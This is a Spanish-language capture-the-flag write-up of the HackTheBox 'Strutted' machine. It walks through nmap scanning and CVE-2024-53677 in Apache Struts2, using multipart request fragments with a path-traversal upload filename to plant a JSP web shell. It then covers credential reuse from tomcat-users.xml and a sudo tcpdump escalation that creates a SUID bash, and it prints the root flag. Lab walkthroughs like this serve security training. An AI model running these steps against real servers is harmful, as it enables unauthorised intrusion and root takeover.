---
layout: single
title: "Machines - Strutted (HTB)"
author_profile: true
published: true
toc: true
toc_sticky: true
comments: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades practicando todo el proceso de _pentesting_ como la _obtención de información_, _explotación_ para obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/Strutted/logo.png" | relative_url }}){: .align-center}

## Resumen Strutted

Esta máquina Linux, se exploran varios conceptos y para facilitarlos, hablaremos de ellos siguiendo el path de ataque: 

1. __Enumeración__ de la página web para encontrar funcionalidades y versiones de sus componentes
2. __Threat Intelligence__ Para búsqueda de vulnerabilidades de sus componentes
3. __Explotación CVE-2024–53677__ Abusar de una vulnerabilidad de _Apache Stratus2_
4. __Escalado de Privilegios__ Para descubrir contraseñas en archivos de configuración
5. __PE - Abuso de binario__ Escalado de privilegios abusando de derechos de ejecución con _sudo_

## Laboratorio

### Enumeración

Como acostumbramos, enuemramos inicialmente el objetivo con `nmap` con las siguientes flags:


```bash
❯ nmap -p- --min-rate 5000 -n -Pn 10.10.11.59 --open -oG allports
```

* `-p-` Indica el escaneo de los 65,535 puertos
* `--min-rate 5000` Indica la velocidad de transmisión de paquetes (a una tasa mínima de 5,000 paquetes por segundo)
* `-n` Deshabilita la resolución DNS de la IP
* `-Pn` Deshabilita el reconocimiento con icmp que realiza `nmap` para determinar si el host está activo o no
* `10.10.11.82` La IP objetivo
* `-oG allports` Indica un archivo de salida en formato grepeable (facilita mucho el utilizar bash para la extracción de información del archivo)

Y obtenemos los siguientes resultados:

```js
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-25 00:24 CST
Nmap scan report for 10.10.11.59
Host is up (0.19s latency).
Not shown: 61478 closed tcp ports (conn-refused), 4055 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora, para obtener __mayor información de los servicios__, volvemos a realizar un escaneo de `nmap`, esta vez, con algunas flags que recopilarán mayor información:

```bash
nmap -p22,80 -sCV -n -Pn 10.10.11.59 -oN OpenPorts
```

* `-p22,80` Limita el escaneo a sólo estos 2 puertos
* `-sCV` Son 2 flags combinadas de nmap (-sC) para la ejecución de scripts por defecto de nmap (mayor información) y (-sV) para determinar la versión del servicio
* `-oN OpenPorts` Indica que el output del comando lo reporte en un formato nmap, la salida de lo que veas en consola será lo que verás en el archivo.

Terminando la ejecución veremos los siguientes detalles:

```js
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-25 00:26 CST
Nmap scan report for 10.10.11.59
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Como vemos en la salida, se está redirigiendo a `http://strutted.htb/`, pero nuestra máquina, no sabe qué es `strutted.htb`; Para que el navegador resuelva el nombre del dominio, es necesario agregarlo a `/etc/hosts` Como sigue:

```bash
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others
10.10.11.59     strutted.htb
```

Internamente, cuando nosotros utilizamos nombres de dominio, el sistema revisa si lo tenemos registrado en este archivo __antes de preguntar al DNS__, es por ello que debemos ponerlo en el archivo, esto es necesario cada vez que se redirige de esta manera y básicamente, __obligatorio__ cuando se trabaja en _Active Directory_.

Continuando, sin mucho que hacer, investigamos la página web:

![UTMP]({{ "/images/Strutted/Page.png" | relative_url }}){: .align-center}

__Aquí hay algo importante a ir notando__: Hay una nota que nos indica que es posible ver la _imagen de docker_ de la página __para conocer cómo está configurada__ Y arriba a la derecha el botón de `Download`.

Descargamos el archivo y vemos el contenido, que a primera vista, __es una aplicación Java__; el archivo `tomcat-users.xml` es importantísimo pues aquí __hay credenciales que podemos llegar a utilizar__ y acceder al portal de administración Y de aquí, sólo crear una aplicación war con msfvenom y obtener nuestra shell al sistema... __Pero no es el caso__, pues no permite ingresar al portal de administración, sin mucho que perder, buscamos el archivo `pom.xml`; Este archivo contiene las dependencias de la aplicación:

![UTMP]({{ "/images/Strutted/pomxml.png" | relative_url }}){: .align-center}

En algunas listadas, aparece `Struts2` y si buscamos su versión `6.3.0.1` __Obtenemos un hit de un CVE__

### Threat Intelligence

__CVE-2024-53677__ _Es una vulnerabilidad en la lógica de Apache Struts 2 que permite la subida arbitraria de arhcivos que usen el interceptor de subida de arhcivos; Archivos subidos con un path traversal relativo en el nombre resultan en la escritura arbitraria facilitando la ejecución de código..._.

El componente vulnerable es _el interceptor_ que es un componente importante en _Struts_, tiene distintas funciones pero lo importante, es que __se ejecuta antes y después de una acción__: Durante el _File Upload_, todos los parámetros se mandan al interceptor, luego se convierten en objetos java y __los asigna a la clase Action__. 

Ahora, entra otro concepto importante: el OGNL, que se utiliza para __mapear parámetros HTTP, que internamente, son Propiedades del objeto Action__ que aunque la aplicación haga validaciones sobre los archivos subidos al servidor, manipulando con OGNL podemos realizar la subida arbitraria de archivos y el RCE.

Abrimos nuestro _Web Proxy Favorito_ y hacemos una petición con un archivo de prueba:

![UTMP]({{ "/images/Strutted/caido1.png" | relative_url }}){: .align-center}

###### Nota: Para el archivo de prueba sólo basta con hacer "echo 'GIF87a\n' > text.gif" para imitar el MIME de un gif

Con nuestra _request de prueba_, mandamos la petición a _Repeater_ Y empezamos a crear nuestra request maliciosa.

### Explotación CVE-2024–53677

Primero, para la _webshell_ escogemos la de este [PoC del mismo exploit](https://github.com/TAM-K592/CVE-2024-53677-S2-067/blob/ALOK/shell.jsp) Con el archivo en mano, copiamos y pegamos el payload debajo del MIME.

![UTMP]({{ "/images/Strutted/caido2.png" | relative_url }}){: .align-center}

Ahora, _para manipular el OGNL_ debemos copiar una cabecera: el __boundary__ que es un arreglo de caracteres; verás que se repite al inicio de la data POST y al final; pues agrega la misma cabecera __antes del último__.

Una vez agregado, repites la primera información que está al inicio de la petición, ya que alterarás los detalles de ellos:

```bash
------WebKitFormBoundaryET5HdqYZtoiq8VNz
Content-Disposition: form-data; name="top.UploadFileName";

../../cmd211.jsp
```

Con esto, estamos manipulando el nombre de Upload (por ello, también es importante que cambies el primer renglón para que se ajuste a este nombre):

```bash
------WebKitFormBoundaryET5HdqYZtoiq8VNz
Content-Disposition: form-data; name="Upload"; filename="test.gif"
Content-Type: image/png

GIF87a

```

El nombre, debe de ser con extención jsp, que es la _extensión de nuestra web shell_; cuando las subas, deberás tener una respuesta positiva:

![UTMP]({{ "/images/Strutted/caido3.png" | relative_url }}){: .align-center}

Como observarás, el nombre aparece con el path traversal, lo que lo ubicará en el _ROOT_ __del servidor web__

![UTMP]({{ "/images/Strutted/webs1.png" | relative_url }}){: .align-center}

Obteniendo nuestro foothold!.

### Escalado de Privilegios

Enumerando lo más básico, podremos encontrar la configuración rápidamente:

![UTMP]({{ "/images/Strutted/webs2.png" | relative_url }}){: .align-center}

Junto con el archivo `tomcat-users.xml`; Si lo enumeramos también:

![UTMP]({{ "/images/Strutted/Credstu.png" | relative_url }}){: .align-center}

Obtendremos unas credenciales; si queremos tener la posibilidad de usarlas para autenticarnos mediante `SSH`, _lógimanete, debemos saber con qué usuarios podemos utilizarlas_:

![UTMP]({{ "/images/Strutted/home.png" | relative_url }}){: .align-center}

Lo que nos da acceso a la primera flag:

![UTMP]({{ "/images/Strutted/SSH1.png" | relative_url }}){: .align-center}

Lo primero que hacemos, es investigar si podemos utilizar `sudo` para ejecutar algún binario con privilegios, encontrando nuestra vía de escalado.

### PE - Abuso de binario

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```
Si no estás seguro si el binario que listan algunos comandos, puede ser abusable, revisa [GTFOBins](https://gtfobins.github.io/gtfobins/). Y para sopresa quizá de muchos: __Se puede escalar privilegios con tcpdump__ y es muy sencillo.

![UTMP]({{ "/images/Strutted/gtfobins.png" | relative_url }}){: .align-center}

Tan sólo tenemos que:

1. Definir un comando
2. Crear un archivo temporal
3. Hacer echo al comando para mandarlo al archivo
4. Hacer ejecutable el archivo
5. Ejecutar tcpdump con privilegios de root (el `-z` ejecuta un comando sobre el archivo cunado se crea un archivo de captura)

En el siguiente path, voy a copiar el binario `/bin/bash` y le pongo permisos de `SUID`:

```bash
james@strutted:~$ COMMAND='cp /bin/bash /tmp/jsjsjs; chmod 4777 /tmp/jsjsjs'                            
james@strutted:~$ echo "$COMMAND" > $TF                                                                 
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root                          
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ cd /tmp/
james@strutted:/tmp$ ls
jsjsjs
```

Y tan fácíl como ejecutar `./jsjsjs -p` para obtener una shell como root:

```bash
james@strutted:/tmp$ ./jsjsjs -p                                                                        
jsjsjs-5.1# whoami
root
jsjsjs-5.1# cd /root
jsjsjs-5.1# ls
root.txt
jsjsjs-5.1# cat root.txt
c0172e47c8b0bcdeb8fb57b6e1653d3c
```


###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.


